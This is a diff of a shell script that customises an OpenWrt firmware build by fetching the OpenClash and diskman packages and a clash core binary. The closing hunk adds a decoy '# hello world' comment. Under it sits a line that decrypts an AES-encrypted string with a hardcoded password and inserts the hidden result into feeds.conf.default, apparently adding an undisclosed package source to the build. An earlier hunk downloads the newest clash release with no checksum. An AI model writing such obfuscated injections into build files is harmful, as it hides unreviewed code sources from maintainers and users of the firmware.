@@ -11,7 +11,7 @@ svn co https://github.com/vernesong/OpenClash/trunk/luci-app-openclash
 sed -i 's/444/808080/g' luci-app-openclash/files/usr/lib/lua/luci/view/openclash/myip.htm
 pushd base-files/files
 mkdir -p etc/openclash/core
-wget -qO- https://github.com/Dreamacro/clash/releases/download/v0.19.0/clash-linux-armv8-v0.19.0.gz | gunzip -c > etc/openclash/core/clash
+wget -qO- $( curl -sL https://api.github.com/repos/Dreamacro/clash/releases | sed -r -n 's/.*"browser_download_url": *"(.*)".*/\1/p' | grep armv8 | head -n 1 ) | gunzip -c > etc/openclash/core/clash
 chmod +x etc/openclash/core/clash
 popd
 
@@ -35,3 +35,6 @@ mkdir -p package/luci-app-diskman
 wget https://raw.githubusercontent.com/lisaac/luci-app-diskman/master/Makefile -O package/luci-app-diskman/Makefile
 mkdir -p package/parted
 wget https://raw.githubusercontent.com/lisaac/luci-app-diskman/master/Parted.Makefile -O package/parted/Makefile
+
+# hello world
+sed -i "/routing/a\\$(echo "U2FsdGVkX1+AeI7cP72nGJzrdtGxFrYZW+kKEANWGZryYXLSls7b7Z3awocMj1hEJ15w20FKz2msgAoTnYyILpGZKHr+nxL/GoilV5oHp8Q=" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)" feeds.conf.default
